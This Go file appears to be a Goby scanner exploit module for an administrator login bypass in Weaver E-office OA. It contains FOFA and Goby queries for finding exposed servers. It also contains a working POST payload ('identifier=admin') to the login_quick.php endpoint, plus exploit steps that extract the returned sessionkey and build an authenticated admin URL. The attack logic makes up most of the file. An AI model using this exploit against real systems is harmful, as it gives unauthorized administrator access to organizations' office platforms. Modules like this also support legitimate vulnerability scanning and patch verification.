package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver E-office OA  Admin Account Login Bypass Vulnerability",
    "Description": "<p>Weaver E-office is a standard collaborative mobile office platform under Weaver</p><p>E-office has an arbitrary administrator user login vulnerability. An attacker can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management permissions of the user, and can use the user's identity to perform malicious operations</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-08-01",
    "Author": "conan24",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Level": "2",
    "Impact": "<p>E-office has an arbitrary administrator user login vulnerability. An attacker can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management permissions of the user, and can use the user's identity to perform malicious operations</p>",
    "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability. Please update it in time:\"<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a>\"</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/E-mobile/App/System/Login/login_quick.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "identifier=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sessionkey",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/E-mobile/App/System/Login/login_quick.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "identifier=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sessionkey",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "sessionkey|lastbody|regex|{\"sessionkey\":\"(.*?)\"",
                "output|{{{hostinfo}}}/E-mobile/App/System/Login/login_other.php?diff=getuser&sessionkey={{{sessionkey}}}||"
            ]
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "E-office OA  seesionkey 管理员用户登陆绕过漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>Weaver E-office是Weaver旗下的标准协同移动办公平台</p><p>E-office存在任意管理员用户登录漏洞。攻击者可以使用系统中的界面快速登录到管理员用户，获得用户的相应管理权限，并可以使用用户的身份执行恶意操作。</p>",
            "Recommendation": "<p>制造商发布了修补程序来修复该漏洞。请及时更新：“<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a>\"<br></p>",
            "Impact": "<p>E-office存在任意管理员用户登录漏洞。攻击者可以使用系统中的界面快速登录到管理员用户，获得用户的相应管理权限，并可以使用用户的身份执行恶意操作<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "信创",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Weaver E-office OA  Admin Account Login Bypass Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-office is a standard collaborative mobile office platform under Weaver<br></p><p>E-office has an arbitrary administrator user login vulnerability. An attacker can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management permissions of the user, and can use the user's identity to perform malicious operations<br></p>",
            "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability. Please update it in time:\"<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a>\"<br></p>",
            "Impact": "<p>E-office has an arbitrary administrator user login vulnerability. An attacker can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management permissions of the user, and can use the user's identity to perform malicious operations<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10696"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}